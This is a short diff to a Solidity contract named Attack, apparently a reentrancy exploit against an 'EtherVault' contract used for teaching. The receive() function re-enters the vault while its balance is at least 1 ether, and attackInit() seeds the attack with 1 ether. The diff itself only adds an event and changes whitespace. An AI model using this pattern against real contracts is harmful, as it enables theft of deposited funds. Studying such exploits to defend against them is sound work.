@@ -18,6 +18,10 @@ interface IEtherVault {
 } 
 
 contract Attack {
+
+        event Received(uint256 amount, uint256 balance);
+
+
     IEtherVault public immutable etherVault;
     Attack public attackPeer;
 
@@ -29,6 +33,7 @@ contract Attack {
         attackPeer = _attackPeer;
     }
     
+      
     receive() external payable {
         if (address(etherVault).balance >= 1 ether) {
             etherVault.transfer(
@@ -37,7 +42,6 @@ contract Attack {
             );
         }
     }
-
     function attackInit() external payable {
         require(msg.value == 1 ether, "Require 1 Ether to attack");
         etherVault.deposit{value: 1 ether}();
